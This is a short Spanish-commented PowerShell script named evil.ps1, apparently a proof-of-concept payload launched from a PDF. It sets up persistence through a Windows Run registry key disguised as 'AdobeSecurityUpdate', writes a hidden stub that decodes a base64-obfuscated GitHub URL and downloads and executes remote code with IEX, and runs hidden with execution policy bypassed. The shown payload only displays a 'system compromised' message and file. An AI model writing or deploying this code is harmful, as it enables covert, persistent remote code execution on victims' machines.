# evil.ps1 - Con persistencia (se ejecuta al iniciar sesión)

# ====================================================
# 1. Función para instalar persistencia (solo la primera vez)
# ====================================================
function Install-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "AdobeSecurityUpdate"  # Nombre que aparecerá en el registro
    $scriptPath = "$env:TEMP\update.ps1"
    
    # Verificar si ya está instalado para no duplicar
    $existing = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($existing -eq $null) {
        # Crear un script stub en TEMP que ejecutará el payload remoto
        $stub = @"
`$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2plc3VzYjI2L1NjcmlwdFBERi9yZWZzL2hlYWRzL21haW4vZXZpbC5wczE=')); IEX (New-Object Net.WebClient).DownloadString(`$u)
"@
        # Escribir el stub en TEMP
        $stub | Out-File -FilePath $scriptPath -Encoding UTF8
        
        # Crear la entrada en el registro
        Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        
        # Ocultar el archivo stub
        attrib +h $scriptPath
        
        # Registrar en un archivo de log (opcional)
        $log = "$env:TEMP\persistencia.log"
        "Persistencia instalada el $(Get-Date)" | Out-File -FilePath $log -Append
    }
}

# ====================================================
# 2. Ejecutar el payload principal (siempre se ejecuta)
# ====================================================
function Show-Payload {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show('Ejecutando payload desde PDF... Sistema comprometido!', 'Alerta de Seguridad')
    
    $desktop = [Environment]::GetFolderPath("Desktop")
    $file = "$desktop\COMPROMETIDO.txt"
    "El sistema fue comprometido el $(Get-Date)" | Out-File $file
    
    Start-Process notepad.exe $file
}

# ====================================================
# 3. Ejecutar todo
# ====================================================
# Instalar persistencia (solo la primera vez)
Install-Persistence

# Mostrar el payload (siempre)
Show-Payload
